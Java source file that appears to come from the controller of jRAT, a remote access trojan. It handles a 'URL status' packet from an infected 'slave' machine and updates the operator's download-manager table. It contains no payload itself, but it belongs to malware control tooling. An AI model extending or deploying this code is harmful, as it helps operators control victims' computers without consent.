package io.jrat.controller.packets.incoming;

import iconlib.IconUtils;
import io.jrat.controller.Slave;
import io.jrat.controller.ui.frames.FrameControlPanel;
import io.jrat.controller.ui.panels.PanelControlDownloadManager;
import java.io.DataInputStream;
import javax.swing.ImageIcon;


public class Packet27URLStatus extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String url = slave.readLine();
		String status = slave.readLine();

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		if (frame != null) {
			PanelControlDownloadManager panel = (PanelControlDownloadManager) frame.panels.get("download manager");
			for (int i = 0; i < panel.getModel().getRowCount(); i++) {
				String key = panel.getModel().getValueAt(i, 1).toString();
				if (key.equals(url)) {
					String ic = null;
					if (status.equalsIgnoreCase("Downloading")) {
						ic = "update";
					} else if (status.equalsIgnoreCase("Downloaded")) {
						ic = "enabled";
					} else {
						ic = "enabled";
					}
					panel.getModel().setValueAt(status, i, 4);
					ImageIcon icon = IconUtils.getIcon(ic, true);
					panel.getModel().setValueAt(icon, i, 0);
					break;
				}
			}
		}
	}

}